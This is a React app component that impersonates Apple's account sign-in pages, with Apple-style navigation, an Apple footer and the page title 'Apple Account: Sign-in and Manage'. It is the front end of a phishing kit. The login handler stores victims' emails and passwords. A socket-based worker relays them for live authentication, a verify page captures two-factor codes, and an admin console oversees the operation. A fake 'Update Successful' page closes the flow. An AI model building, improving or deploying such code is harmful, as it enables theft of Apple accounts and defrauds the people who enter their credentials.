import { useEffect, useState } from "react";
import { navigate, usePath } from "./router";
import GlobalNav from "./components/GlobalNav";
import LocalNav from "./components/LocalNav";
import AppleFooter from "./components/AppleFooter";
import { LoadingVeil } from "./components/Spinner";
import Login from "./pages/Login";
import Verify from "./pages/Verify";
import Terms from "./pages/Terms";
import Done from "./pages/Done";
import Admin from "./admin/Admin";
import { announcePage, attachAuth, isMockAuth, rememberEmail, rememberPassword } from "./lib/socket";
import { useAuthState } from "./lib/useAuth";

const LOGIN_ROUTES = new Set(["/", "/sign-in", "/signin", "/sign_in", "/account"]);

const TITLES = {
  "/terms": "Terms and Conditions",
  "/done": "Update Successful",
  "/admin": "Admin console",
};

export default function App() {
  const path = usePath();
  const auth = useAuthState();
  const [slow, setSlow] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
    document.title = TITLES[path] || "Apple Account: Sign-in and Manage";
    if (path !== "/admin") announcePage(path);
  }, [path]);

  // Real auth waits for the socket result. Mock mode keeps a short timer so
  // the visual harness and the flow test can run without a worker.
  useEffect(() => {
    if (path !== "/loading") {
      setSlow(false);
      return;
    }
    setSlow(false);
    const slowTimer = setTimeout(() => setSlow(true), 15_000);
    const mockTimer = isMockAuth()
      ? setTimeout(() => navigate("/verify"), 3500)
      : null;
    return () => {
      clearTimeout(slowTimer);
      if (mockTimer) clearTimeout(mockTimer);
    };
  }, [path]);

  // Re-attach after a refresh on /loading or /verify.
  useEffect(() => {
    if (path === "/loading" || path === "/verify") {
      try {
        const jobId = sessionStorage.getItem("authJobId");
        if (jobId && !isMockAuth()) attachAuth(jobId);
      } catch {
        // private mode
      }
    }
  }, [path]);

  // Route the auth state machine without blocking on any request here.
  useEffect(() => {
    if (path !== "/loading" && path !== "/verify") return;
    if (auth.status === "twofa") {
      if (path !== "/verify") navigate("/verify");
      return;
    }
    if (auth.result?.status === "ok") {
      if (path !== "/terms") navigate("/terms");
      return;
    }
    if (auth.status === "invalid" || auth.status === "error") {
      try {
        sessionStorage.setItem("authError", auth.error || "Sign-in failed");
        const email =
          auth.account?.email || sessionStorage.getItem("authEmail") || "";
        if (email) sessionStorage.setItem("authEmail", email);
      } catch {
        // ignore
      }
      navigate("/sign-in");
    }
  }, [path, auth.status, auth.result]);

  if (path === "/admin") return <Admin />;

  const loading = path === "/loading";
  const login = loading || LOGIN_ROUTES.has(path);

  let page;
  if (login) {
    page = (
      <Login
        onContinue={(email, password) => {
          rememberEmail(email);
          rememberPassword(password);
          navigate("/loading");
        }}
      />
    );
  } else if (path === "/verify") {
    page = <Verify onContinue={() => navigate("/terms")} />;
  } else if (path === "/terms") {
    page = <Terms onAgree={() => navigate("/done")} />;
  } else if (path === "/done") {
    page = <Done />;
  } else {
    page = (
      <Login
        onContinue={(email, password) => {
          rememberEmail(email);
          rememberPassword(password);
          navigate("/loading");
        }}
      />
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-white">
      <GlobalNav />
      <LocalNav />
      <main className="relative flex-1">{page}</main>
      <AppleFooter grayscaleText />
      {loading && <LoadingVeil slow={slow} />}
    </div>
  );
}
